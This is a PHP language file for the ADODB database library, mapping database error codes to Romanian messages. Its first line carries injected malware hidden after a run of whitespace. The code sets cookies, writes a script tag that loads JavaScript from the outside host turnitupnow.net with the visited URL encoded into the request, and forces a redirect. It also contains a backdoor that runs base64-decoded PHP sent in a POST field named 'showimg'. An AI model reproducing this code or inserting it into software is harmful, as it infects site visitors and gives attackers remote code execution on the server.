<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


/* Romanian - by "bogdan stefan" <sbogdan#rsb.ro> */

$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'ro',
            DB_ERROR                    => 'eroare necunoscuta',
            DB_ERROR_ALREADY_EXISTS     => 'deja exista',
            DB_ERROR_CANNOT_CREATE      => 'nu se poate creea',
            DB_ERROR_CANNOT_DELETE      => 'nu se poate sterge',
            DB_ERROR_CANNOT_DROP        => 'nu se poate executa drop',
            DB_ERROR_CONSTRAINT         => 'violare de constrain',
            DB_ERROR_DIVZERO            => 'se divide la zero',
            DB_ERROR_INVALID            => 'invalid',
            DB_ERROR_INVALID_DATE       => 'data sau timp invalide',
            DB_ERROR_INVALID_NUMBER     => 'numar invalid',
            DB_ERROR_MISMATCH           => 'nepotrivire-mismatch',
            DB_ERROR_NODBSELECTED       => 'nu exista baza de date selectata',
            DB_ERROR_NOSUCHFIELD        => 'camp inexistent',
            DB_ERROR_NOSUCHTABLE        => 'tabela inexistenta',
            DB_ERROR_NOT_CAPABLE        => 'functie optionala neinstalata',
            DB_ERROR_NOT_FOUND          => 'negasit',
            DB_ERROR_NOT_LOCKED         => 'neblocat',
            DB_ERROR_SYNTAX             => 'eroare de sintaxa',
            DB_ERROR_UNSUPPORTED        => 'nu e suportat',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'valoare prea mare pentru coloana',
            DB_ERROR_INVALID_DSN        => 'DSN invalid',
            DB_ERROR_CONNECT_FAILED     => 'conectare esuata',
            0	                       => 'fara eroare', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'data introduse insuficiente',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extensie negasita',
            DB_ERROR_NOSUCHDB           => 'nu exista baza de date',
            DB_ERROR_ACCESS_VIOLATION   => 'permisiuni insuficiente'
);
?>